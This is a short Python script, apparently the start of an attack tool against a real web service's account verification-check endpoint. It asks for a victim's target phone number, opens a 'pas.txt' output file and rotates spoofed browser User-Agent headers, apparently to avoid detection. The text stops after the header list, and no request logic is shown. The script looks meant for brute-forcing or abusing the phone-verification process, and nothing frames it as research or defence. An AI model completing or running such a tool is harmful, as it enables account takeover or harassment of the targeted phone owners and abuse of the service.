import winsound
from colorama import Fore as color  
number = str(input(color.GREEN+" Enter the target number without 0: "+color.MAGENTA+"( 9057767099 )"))
try:
    if number.index("0") == 0 :
        while number.index("0") == 0 :
            print(color.RED+"It should not have zero")
            number = input(color.GREEN+" Enter the target number without 0: "+color.MAGENTA+"( 9057767099 )  ")
except :
    pass

link = "https://mymoodic.com/ac/v1/account/check-verification"
adad = open("pas.txt","w+")

heads = [

    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
